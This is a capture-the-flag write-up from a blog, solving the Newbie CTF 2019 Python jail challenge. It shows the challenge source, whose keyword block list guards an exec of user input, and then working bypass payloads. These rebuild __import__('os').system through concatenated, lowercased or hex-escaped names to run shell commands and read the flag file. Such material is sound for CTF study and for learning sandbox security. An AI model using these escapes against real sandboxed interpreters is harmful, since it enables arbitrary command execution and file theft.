---
title: "How to Python jail escape (Newbie CTF 2019) - DSPYT"
date: "May 1, 2022"
excerpt: "Python jail escape: a challenge with one of the lowest points in the Newbie CTF 2019 which we solve in this article. We use built-in methods."
cover_image: "/images/posts/jailescape/image-e1658960653261.webp"
time_read: "5 min"
tags: ["Python", "ctf", "ethical-hacking"]
---

Python jail escape: a challenge with one of the lowest points in the Newbie CTF 2019 which we solve in this article. It is generally a bad idea to allow users to input commands that will be executed, since there is a high chance that they could input something that would allow them to gain elevated permissions or access sensitive data. However, people often add condition checks in an attempt to prevent this from happening, even though it is rarely effective.

![Python jail Escape](/images/posts/jailescape/image-2.webp)

## Python Jail escape: Code

We connect to the virtual environment. Next the following text appears:

<div style="background: #f0f0f0; overflow:auto;width:auto;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">Hi! Welcome to pyjail!
<span style="color: #666666">========================================================================</span>
<span style="color: #60a0b0; font-style: italic">#! /usr/bin/python3</span>
<span style="color: #60a0b0; font-style: italic">#-*- coding:utf-8 -*-</span>
def main<span style="color: #666666">()</span>:
print<span style="color: #666666">(</span>“Hi! Welcome to pyjail!”<span style="color: #666666">)</span>
print<span style="color: #666666">(</span>“<span style="color: #666666">========================================================================</span>”<span style="color: #666666">)</span>
print<span style="color: #666666">(</span>open<span style="color: #666666">(</span>__file__<span style="color: #666666">)</span>.read<span style="color: #666666">())</span>
print<span style="color: #666666">(</span>“<span style="color: #666666">========================================================================</span>”<span style="color: #666666">)</span>
print<span style="color: #666666">(</span>“RUN”<span style="color: #666666">)</span>
<span style="color: #bb60d5">text</span> <span style="color: #666666">=</span> input<span style="color: #666666">(</span>‘&gt;&gt;&gt; ‘<span style="color: #666666">)</span>
<span style="color: #007020; font-weight: bold">for </span>keyword in <span style="color: #666666">[</span>‘eval’, ‘exec’, ‘import’, ‘open’, ‘os’, ‘read’, ‘system’, ‘write’<span style="color: #666666">]</span>:
<span style="color: #007020; font-weight: bold">if </span>keyword in text:
print<span style="color: #666666">(</span>“No!!!”<span style="color: #666666">)</span>
<span style="color: #007020; font-weight: bold">return</span>;
<span style="color: #007020; font-weight: bold">else</span>:
<span style="color: #007020">exec</span><span style="color: #666666">(</span>text<span style="color: #666666">)</span>
<span style="color: #007020; font-weight: bold">if </span><span style="color: #bb60d5">__name__</span> <span style="color: #666666">==</span> “__main__”:
main<span style="color: #666666">()</span>
<span style="color: #666666">========================================================================</span>
RUN
</pre></div>

The source code for the program is available, so we can figure out what needs to be done in order to beat the condition checks. The functions that could be used to get the flag are not allowed :'eval’, ‘exec’, ‘import’, ‘open’, ‘os’, ‘read’, ‘system’, ‘write’. However, we could utilize the concatenation of strings to evade the restriction as well as using [Built-in functions](https://docs.python.org/3/library/functions.html).

In order to understand how Python evaluates statements, let’s take a look at an example. If you write “import os” in a Python script, Python will retrieve a function object called “import” and pass it the input “os”. This will return a class called “os” with the relevant methods. Besides, you can use built-in objects in Python by using the **builtins** module. This module is not typically accessed directly by most applications. Nevertheless, it can be useful for modules that provide objects with the same name as a built-in value.

<div style="background: #f0f0f0; overflow:auto;width:auto;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #c65d09; font-weight: bold">&gt;&gt;&gt; </span><span style="color: #007020; font-weight: bold">print</span>(<span style="color: #007020">getattr</span>(<span style="color: #007020">getattr</span>(<span style="color: #007020">globals</span>()[<span style="color: #4070a0">&#39;__builtins__&#39;</span>], <span style="color: #4070a0">&#39;__im&#39;</span><span style="color: #666666">+</span><span style="color: #4070a0">&#39;port__&#39;</span>)(<span style="color: #4070a0">&#39;o&#39;</span><span style="color: #666666">+</span><span style="color: #4070a0">&#39;s&#39;</span>), <span style="color: #4070a0">&#39;sys&#39;</span><span style="color: #666666">+</span><span style="color: #4070a0">&#39;tem&#39;</span>)(<span style="color: #4070a0">&#39;ls .&#39;</span>))
<span style="color: #888888">bin</span>
<span style="color: #888888">boot</span>
<span style="color: #888888">dev</span>
<span style="color: #888888">etc</span>
<span style="color: #888888">home</span>
<span style="color: #888888">lib</span>
<span style="color: #888888">lib32</span>
<span style="color: #888888">lib64</span>
<span style="color: #888888">libx32</span>
<span style="color: #888888">media</span>
<span style="color: #888888">mnt</span>
<span style="color: #888888">opt</span>
<span style="color: #888888">proc</span>
<span style="color: #888888">root</span>
<span style="color: #888888">run</span>
<span style="color: #888888">sbin</span>
<span style="color: #888888">srv</span>
<span style="color: #888888">sys</span>
<span style="color: #888888">tmp</span>
<span style="color: #888888">usr</span>
<span style="color: #888888">var</span>
<span style="color: #888888">0</span>
<span style="color: #c65d09; font-weight: bold">&gt;&gt;&gt; </span><span style="color: #007020; font-weight: bold">print</span>(<span style="color: #007020">getattr</span>(<span style="color: #007020">getattr</span>(<span style="color: #007020">globals</span>()[<span style="border: 1px solid #FF0000">‘</span>__builtins__<span style="border: 1px solid #FF0000">’</span>], <span style="border: 1px solid #FF0000">‘</span>__im<span style="border: 1px solid #FF0000">’</span><span style="color: #666666">+</span><span style="border: 1px solid #FF0000">’</span>port__<span style="border: 1px solid #FF0000">’</span>)(<span style="border: 1px solid #FF0000">‘</span>o<span style="border: 1px solid #FF0000">’</span><span style="color: #666666">+</span><span style="border: 1px solid #FF0000">’</span>s<span style="border: 1px solid #FF0000">’</span>), <span style="border: 1px solid #FF0000">‘</span>sys<span style="border: 1px solid #FF0000">’</span><span style="color: #666666">+</span><span style="border: 1px solid #FF0000">’</span>tem<span style="border: 1px solid #FF0000">’</span>)(<span style="border: 1px solid #FF0000">‘</span>cat home<span style="color: #666666">/</span>python_jail<span style="color: #666666">/</span>flag<span style="border: 1px solid #FF0000">’</span>))

<span style="color: #888888">KorNewbie{H311o*h0w*@r3_y0u_d0lng?}</span>

</pre></div>

Another solution to the Capture the Flag challenge is to use lower() string method:

<div style="background: #f0f0f0; overflow:auto;width:auto;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #888888">&gt;&gt;&gt;__builtins__.__dict__[‘__IMPORT__’.lower()](‘OS’.lower()).__dict__[‘SYSTEM’.lower()](‘cat /home/python_jail/flag’)</span>
</pre></div>

We could also encode the strings to display the hidden key:

<div style="background: #f0f0f0; overflow:auto;width:auto;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #c65d09; font-weight: bold">&gt;&gt;&gt; </span><span style="color: #007020; font-weight: bold">print</span>(<span style="color: #007020">getattr</span>(<span style="color: #007020">getattr</span>(<span style="color: #007020">getattr</span>(main, <span style="border: 1px solid #FF0000">‘</span>__globals__<span style="border: 1px solid #FF0000">’</span>)[<span style="border: 1px solid #FF0000">‘</span>__builtins__<span style="border: 1px solid #FF0000">’</span>], <span style="border: 1px solid #FF0000">‘</span>\x6f\x70\x65\x6e<span style="border: 1px solid #FF0000">’</span>)(<span style="border: 1px solid #FF0000">‘</span><span style="color: #666666">/</span>home<span style="color: #666666">/</span>python_jail<span style="color: #666666">/</span>flag<span style="border: 1px solid #FF0000">’</span>, <span style="border: 1px solid #FF0000">‘</span>rb<span style="border: 1px solid #FF0000">’</span>), <span style="border: 1px solid #FF0000">‘</span>\x72\x65\x61\x64<span style="border: 1px solid #FF0000">’</span>)())
<span style="color: #888888">b’\xef\xbb\xbfKorNewbie{H311o_h0w_@r3_y0u_d0lng?}</span>
</pre></div>

## Related Posts

- [Simple Ceramic Data Model App and Unstoppable Domains](https://dspyt.com/simple-app-with-ceramic-data-model-and-unstoppable-domains)
- [Simple QR code generator on AWS with Flask](https://dspyt.com/simple-qr-code-generator-on-aws-with-flask)
- [How to implement asyncio python tutorial](https://dspyt.com/simple-asynchronous-python-webscraper-tutorial)
- [How to generate parsiq wallet triggers for CryptoPunks](https://dspyt.com/generating-fast-and-easy-parsiq-triggers-for-cryptopunks)
- [Guide to Marhaba Decentralized Financial Platform](https://dspyt.com/mrhb-defi-great-technologies-and-functionalities)
